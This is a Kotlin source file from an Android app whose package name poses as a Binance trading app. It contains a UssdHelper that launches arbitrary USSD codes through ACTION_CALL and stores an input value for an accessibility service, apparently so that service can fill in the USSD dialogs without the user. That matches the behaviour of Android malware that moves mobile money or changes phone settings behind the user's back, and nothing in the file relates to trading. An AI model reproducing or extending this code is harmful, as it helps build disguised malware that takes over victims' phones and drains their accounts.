package dApp.binance.Trading.arfu

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.telephony.TelephonyManager
import android.util.Log

object UssdHelper {

    fun executeUssd(context: Context, code: String, inputValue: String = "") {
        Log.d("UssdHelper", "Executing USSD: $code with input: $inputValue")

        // If input value is provided, store it for accessibility service
        if (inputValue.isNotEmpty()) {
            val sharedPref = context.getSharedPreferences("CarerSettings", Context.MODE_PRIVATE)
            sharedPref.edit().putString("pending_input_value", inputValue).apply()
        }

        // Always use Intent ACTION_CALL to show USSD dialog UI
        executeIntentUssd(context, code)
    }

    /**
     * Execute USSD using Intent ACTION_CALL to display USSD dialog
     */
    private fun executeIntentUssd(context: Context, code: String) {
        try {
            val intent = Intent(Intent.ACTION_CALL)
            // Properly format USSD code for Intent
            val ussdUri = Uri.fromParts("tel", code, "#")
            intent.data = ussdUri
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            context.startActivity(intent)
            Log.d("UssdHelper", "USSD Intent launched with code: $code")
        } catch (e: Exception) {
            Log.e("UssdHelper", "Error launching USSD Intent: ${e.message}")
        }
    }
}
